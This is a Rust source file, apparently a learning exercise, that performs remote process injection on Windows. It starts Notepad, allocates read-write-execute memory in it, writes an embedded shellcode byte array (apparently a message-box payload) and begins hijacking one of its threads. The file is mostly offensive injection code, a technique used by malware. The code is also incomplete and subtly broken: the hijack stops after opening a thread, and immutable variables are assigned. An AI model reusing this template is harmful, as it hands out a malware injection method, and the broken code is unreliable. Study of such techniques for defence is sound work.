use windows_sys::Win32::System::Threading;
use windows_sys::Win32::Foundation;
use windows_sys::Win32::System::Memory::{VirtualAllocEx, PAGE_EXECUTE_READWRITE, MEM_COMMIT};
use windows_sys::Win32::System::Diagnostics::ToolHelp::CreateToolhelp32Snapshot;
use windows_sys::Win32::System::Diagnostics::ToolHelp::TH32CS_SNAPTHREAD;
use windows_sys::Win32::System::Diagnostics::ToolHelp::{Thread32First, Thread32Next};
use windows_sys::Win32::System::Diagnostics::ToolHelp::THREADENTRY32;
use windows_sys::Win32::System::Diagnostics::Debug::{WriteProcessMemory, CONTEXT, CONTEXT_0_0};
use std::process::{Command, Child};
use std::io::{self, Write};
use std::mem::size_of;
use std::os::windows::io::AsHandle;
use std::thread;
use std::time::Duration;

const SHELLCODE: [u8; 358] = [0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,
0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,0x8b,
0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,
0x3e,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,
0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,0x48,0x8b,0x52,0x20,
0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,0x00,
0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,
0x8b,0x48,0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,
0x5c,0x48,0xff,0xc9,0x3e,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,0x08,
0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,
0x01,0xd0,0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,
0x1c,0x49,0x01,0xd0,0x3e,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,
0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,
0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,
0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x3e,
0x48,0x8d,0x8d,0x4e,0x01,0x00,0x00,0x41,0xba,0x4c,0x77,0x26,
0x07,0xff,0xd5,0x49,0xc7,0xc1,0x40,0x00,0x00,0x00,0x3e,0x48,
0x8d,0x95,0x2a,0x01,0x00,0x00,0x3e,0x4c,0x8d,0x85,0x47,0x01,
0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,
0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,
0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,
0x89,0xda,0xff,0xd5,0x53,0x65,0x65,0x21,0x20,0x54,0x68,0x65,
0x20,0x53,0x68,0x65,0x6c,0x6c,0x20,0x43,0x6f,0x64,0x65,0x20,
0x45,0x78,0x65,0x63,0x75,0x74,0x65,0x64,0x00,0x54,0x61,0x64,
0x61,0x61,0x61,0x00,0x75,0x73,0x65,0x72,0x33,0x32,0x2e,0x64,
0x6c,0x6c,0x00];

fn main() -> io::Result<()> {
    // Launch Notepad
    let mut child: Child = Command::new("notepad")
        .spawn()?
        .try_into()
        .expect("Failed to start Notepad");

    // Wait for a brief moment to ensure Notepad has started
    thread::sleep(Duration::from_secs(2));
    // Get the process ID of the Notepad instance
    let pid = child.id();
    println!("Notepad started with PID: {}", pid);
    unsafe {

        let threadHijacked: Foundation::HANDLE;
        let snapshot: Foundation::HANDLE;
        let threadEntry: THREADENTRY32 = THREADENTRY32::default();
        let context: CONTEXT;
        // context.ContextFlags;
        threadEntry.dwSize =  size_of::<THREADENTRY32>() as u32;

        // Open a handle to the Notepad process
        let handle =
            Threading::OpenProcess(
                Threading::PROCESS_ALL_ACCESS,
                Foundation::FALSE,
                pid,
            );

        if (handle == Foundation::INVALID_HANDLE_VALUE) {
            println!("Failed to open handle to Notepad process");
            return Ok(());
        }
        println!("Opened handle to Notepad process: {}", handle);

        // Allocate memory in the Notepad process
        let addr = VirtualAllocEx(
            handle,
            0 as *mut _,
            SHELLCODE.len(),
            MEM_COMMIT,
            PAGE_EXECUTE_READWRITE,
        );

        if (addr == 0 as *mut _) {
            println!("Failed to allocate memory in Notepad process");
            return Ok(());
        }
        println!("Allocated memory in Notepad process: {:?}", addr);

        // Write the shellcode to the allocated memory
        let mut bytes_written: usize = 0;
        let result = WriteProcessMemory(
            handle,
            addr,
            SHELLCODE.as_ptr() as *const _,
            SHELLCODE.len(),
            &mut bytes_written,
        );

        if (result == Foundation::FALSE) {
            println!("Failed to write shellcode to Notepad process");
            return Ok(());
        }
        println!("Wrote shellcode to Notepad process: {}", bytes_written);

        // Get a handle to the thread in the Notepad process
        snapshot = CreateToolhelp32Snapshot(
            TH32CS_SNAPTHREAD,
            pid,
        );
        Thread32First(
            snapshot,
            &mut threadEntry,
        );
        // Iterate over the threads in the Notepad process
        while (Thread32Next(snapshot, &mut threadEntry) != Foundation::FALSE) {
            if (threadEntry.th32OwnerProcessID == pid)
            {
                threadHijacked = Threading::OpenThread(Threading::THREAD_ALL_ACCESS,
                                                       Foundation::FALSE,
                                                       threadEntry.th32ThreadID);
                break;
            }
        }

        // Optionally, you can wait for the Notepad process to exit
        //let status = child.wait()?;
        //println!("Notepad exited with: {:?}", status);
    };
    Ok(())
}
